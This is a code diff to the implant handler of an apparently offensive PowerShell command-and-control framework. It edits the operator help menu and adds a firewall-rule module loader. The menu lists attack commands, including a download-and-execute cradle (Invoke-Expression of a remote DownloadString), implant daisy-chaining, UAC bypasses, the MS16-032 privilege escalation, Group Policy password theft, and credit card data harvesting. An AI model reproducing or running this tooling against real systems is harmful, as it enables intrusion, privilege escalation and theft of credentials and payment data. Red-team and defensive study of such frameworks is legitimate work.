@@ -133,12 +133,13 @@ function Implant-Handler
         write-host " ModulesLoaded " -ForegroundColor Green 
         write-host " LoadModule <modulename>" -ForegroundColor Green 
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
-        write-host " Invoke-Expression (Get-Webclient).DownloadString(\"https://module.ps1\")" -ForegroundColor Green
+        write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
         write-host " StartAnotherImplant" -ForegroundColor Green 
         write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
         write-host " Invoke-DaisyChain -port 4444 -daisyserver 192.168.1.1" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfixes" -ForegroundColor Green 
+        write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
         write-host " EnableRDP" -ForegroundColor Green
         write-host " DisableRDP" -ForegroundColor Green
         write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
@@ -147,8 +148,7 @@ function Implant-Handler
         write-host " Invoke-AllChecks" -ForegroundColor Green
         write-host " Invoke-UACBypass" -ForegroundColor Green
         write-host " Invoke-UACBypassProxy" -ForegroundColor Green
-        write-host ' Get-MSHotfixes | Where-Object -Property hotfixid -EQ KB3176936' -ForegroundColor Green
-        Write-Host ' Get-MSHotFixes | Where-Object {$_.hotfixid -eq "KB2852386"} - this is specifically for PowerShell 2.0' -ForegroundColor Green
+        Write-Host ' Get-MSHotFixes | Where-Object {$_.hotfixid -eq "KB2852386"}' -ForegroundColor Green
         write-host " Invoke-MS16-032" -ForegroundColor Green 
         write-host " Invoke-MS16-032-ProxyPayload" -ForegroundColor Green 
         write-host " Get-GPPPassword" -ForegroundColor Green 
@@ -839,6 +839,10 @@ param
             if ($pscommand.ToLower().StartsWith('invoke-sqlquery'))
             { 
                 CheckModuleLoaded "Invoke-SqlQuery.ps1" $psrandomuri
+            }
+            if ($pscommand.ToLower().StartsWith('get-firewall'))
+            { 
+                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('invoke-psinject'))
             { 
